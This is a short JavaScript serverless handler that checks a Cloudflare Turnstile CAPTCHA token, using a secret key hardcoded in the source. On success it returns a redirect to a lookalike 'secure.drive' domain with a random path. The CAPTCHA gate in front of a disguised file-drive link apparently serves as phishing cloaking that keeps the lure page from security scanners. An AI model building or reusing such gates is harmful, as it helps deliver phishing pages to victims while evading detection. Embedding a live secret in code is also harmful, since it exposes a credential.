export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const token = req.body['cf-turnstile-response'];
  const secret = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA'; // Replace this with your Cloudflare Turnstile secret key

  if (!token) {
    return res.status(400).json({ error: 'Missing CAPTCHA token' });
  }

  const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `secret=${secret}&response=${token}`,
  });

  const data = await verifyRes.json();

  if (data.success) {
    // ✅ Send a redirect URL in the JSON response
    return res.status(200).json({ redirect: 'https://secure.drive.admindoandhsevefile.space/hKYUcWCu' });
  } else {
    return res.status(401).json({ error: 'CAPTCHA verification failed', details: data });
  }
}
